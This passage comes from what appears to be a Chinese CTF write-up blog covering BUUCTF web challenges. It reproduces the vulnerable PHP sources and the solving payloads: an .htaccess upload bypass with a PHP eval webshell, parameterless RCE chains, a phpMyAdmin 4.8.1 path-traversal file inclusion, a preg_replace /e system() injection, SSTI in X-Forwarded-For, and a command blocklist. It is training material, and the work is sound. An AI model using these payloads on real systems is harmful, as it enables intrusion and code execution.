class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//87d242ef-fc4f-4a1f-aa1c-74a3ce74c7b4.node3.buuoj.cn/?gg[]=1&amp;id[]=2</span></span><br><span class="line"></span><br><span class="line">POST: passwd=1234567a</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>根据各种提示，上传不了ph*的文件，考虑先上传一个.htaccess</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;x.php.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>在上传一个php的马，注意他会检测&lt;?php，用下面的马绕过即可，flag在根目录下</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_GET[x]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">GET /upload/05a4cc97edcd0f5544958e086a68db2c/x.php.jpg?x=var_dump(file_get_contents(%<span class="number">27</span>/flag%<span class="number">27</span>));</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>目录扫.git，用githack还原后源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="built_in">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析后主要有几点</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 过滤了常用的几个伪协议，不能以伪协议读取文件。</span><br><span class="line"><span class="number">2.</span> (?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</span><br><span class="line"><span class="number">3.</span> 正则匹配掉了et/na/info等关键字，很多函数都用不了。</span><br><span class="line"><span class="number">4.</span> <span class="built_in">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]); 典型的无参数RCE</span><br></pre></td></tr></table></figure><p>构造payload</p><p>考虑scandir(&#39;.&#39;)的形式来获取当前目录下的文件信息。</p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.</p><p>current() 返回数组中的当前单元, 默认取第一个值</p><p>于是scandir(&#39;.&#39;)就转化为</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>但还需要取到我们想要的文件及其内容，就需要以下操作</p><ol><li>array_reverse() 以相反的元素顺序返回数组，再搭配next()处理</li><li>array_flip()交换数组的键和值</li><li>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>以上就可以获取到想要的文件名最后调用highlight_file()、readfile()、show_source()、file_get_contents()（被ban）</p><p>另一种方式可以通过session来处理：</p><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。</p><p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p><p>session_id()可以获取到当前的session id。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(session_id(session_start()));</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>目录扫描到有个phpmyadmin，不需要密码，版本4.8.1，是存在漏洞的版本</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">直接利用文件包含就可以</span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../../flag‘</span><br><span class="line"></span><br><span class="line">也可以走代码执行，依次执行</span><br><span class="line">show <span class="built_in">global</span> variables like <span class="string">&quot;%datadir%&quot;</span>;</span><br><span class="line"></span><br><span class="line">use test;</span><br><span class="line">CREATE TABLE test(code varchar(<span class="number">100</span>));</span><br><span class="line">INSERT INTO test(code) VALUES(<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../../<span class="keyword">var</span>/lib/mysql/data/test/test.MYD</span><br><span class="line"></span><br><span class="line">或者包含session文件</span><br><span class="line">?target=db_sql.php%253f/../../../../../../../../tmp/sess_cui65j0c7j9mjmu4b76kio81rj</span><br></pre></td></tr></table></figure><p>db_sql.php可以替换成：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;user_password.php&#x27;</span>,</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>题目给了源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造包（text=data://text/plain,I%20have%20a%20dream）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?text=php:<span class="comment">//input&amp;file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1</span></span><br><span class="line">Host: 0722e0f3-821d-4d78-9dc7-be292c48d6fb.node3.buuoj.cn</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">91.0</span><span class="number">.4472</span><span class="number">.114</span> Safari/<span class="number">537.36</span></span><br><span class="line"><span class="attr">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">I have a dream</span></span><br></pre></td></tr></table></figure><p>将拿到的结果base64 decode</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $re =&gt; $str</span>)</span> &#123;</span><br><span class="line">    echo complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="built_in">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=$&#123;system($_GET[x])&#125;&amp;x=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>flag处回显ip地址的地方SSTI模板注入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>dirsearch扫描到.git，下载源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_POST <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!isset($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure><p>$$变量覆盖问题，这里可以利用exit输出，看GET部分的遍历，假如传进的数据为<code>yds=flag</code>，那么就变为了<code>$yds=flag</code>，再通过<code>exit($yds)</code>输出即可。</p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>分析链接，两个参数，其中img的值两次base64的值，观察发现是转的ascii(主要是看到了2e)，这里应该有文件包含，转为看index.php(TmprMlpUWTBOalUzT0RKbE56QTJPRGN3)，得到源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">&#x27;img&#x27;</span>]) || !isset($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    die(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (string)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        echo <span class="string">`$cmd`</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml">  <span class="selector-tag">body</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">./bj.png</span>)  no-repeat center center;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-size</span>:cover;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-attachment</span>:fixed;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-color</span>:<span class="number">#CCCCCC</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span 